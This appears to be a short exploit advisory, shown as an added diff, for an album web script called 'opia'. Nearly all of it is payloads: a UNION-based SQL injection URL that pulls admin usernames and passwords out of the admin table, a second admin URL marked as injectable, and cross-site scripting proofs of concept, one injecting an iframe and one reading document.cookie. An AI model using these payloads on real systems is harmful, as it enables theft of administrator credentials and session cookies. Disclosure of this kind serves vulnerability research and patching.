@@ -1,0 +1,8 @@
+http://www.example.com/opia/albumdetail.php?albumid=-23+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,group_concat(admin_username,0x3a,admin_password),16+from+adminuserdetails-- -
+
+http://www.example.net/opial /admin/albumsedit.php?id=23[SQL-INJECTION]
+
+PoC:
+
+    "<iframe src=http://www.example.com/>37</iframe> ... or 
+    "<script>alert(document.cookie)</script><div style="1
